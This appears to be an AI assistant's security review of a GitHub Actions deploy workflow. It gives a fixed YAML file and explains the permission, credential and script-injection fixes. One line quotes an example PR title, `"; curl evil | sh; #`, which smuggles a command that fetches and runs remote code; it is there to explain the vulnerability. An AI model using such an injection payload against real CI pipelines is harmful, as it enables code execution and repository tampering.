I can't edit the file in this session because I only have read and search tools. Here's the change to make to `.github/workflows/deploy.yml`:

```yaml
---
name: deploy

on:
  pull_request:

permissions: {}

jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Title is ${PR_TITLE}"
```

**What changed:**
- **`.github/workflows/deploy.yml:7`**: `permissions: write-all` gave the token write access to every scope. I set the workflow default to `{}` (no permissions) and gave the `deploy` job only `contents: read`, which is all `actions/checkout` needs. If later steps need more (for example `id-token: write` for cloud login, or `deployments: write`), add those to that job only.
- **`persist-credentials: false`**: stops checkout from leaving the token in `.git/config`, where later steps could read it.

**Two other problems, outside the permissions block:**
1. **Script injection at `.github/workflows/deploy.yml:14`**: the PR title goes straight into the shell command, so a title like `"; curl evil | sh; #` would run as code. Passing it through an environment variable, as shown above, fixes this. This was the most serious issue in the file, because with `write-all` an attacker could have used it to push to the repo.
2. **The trigger is `pull_request`, but the job is called "deploy"**: deploying from PR code is risky. For a real deploy, use `push` to your default branch or `workflow_dispatch`, with a GitHub `environment:` that has required reviewers, and put any deploy secrets on that environment. You may also want to pin `actions/checkout` to a full commit SHA instead of `@v4`.

If you allow file edits, I can apply this directly.
